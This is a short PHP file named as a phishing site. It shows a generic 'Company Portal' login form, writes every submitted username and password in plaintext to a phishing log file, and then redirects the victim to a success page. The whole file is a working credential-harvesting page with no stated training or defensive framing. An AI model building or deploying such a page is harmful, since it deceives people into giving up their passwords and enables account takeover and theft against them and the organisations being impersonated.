// phishing-site/index.php
<?php
session_start();
$logFile = '/var/log/phishing/access.log';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    
    // Enregistrer les credentials dans le log
    $log = date('Y-m-d H:i:s') . " - Username: $username, Password: $password\n";
    file_put_contents($logFile, $log, FILE_APPEND);
    
    // Rediriger vers la page légitime
    header('Location: /success.html');
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Company Portal Login</title>
    <style>
        body { font-family: Arial, sans-serif; }
        .login-container { 
            width: 300px; 
            margin: 100px auto; 
            padding: 20px;
            border: 1px solid #ccc;
        }
        input { width: 100%; margin: 10px 0; padding: 5px; }
        button { width: 100%; padding: 10px; background: #0066cc; color: white; }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Company Portal</h2>
        <form method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>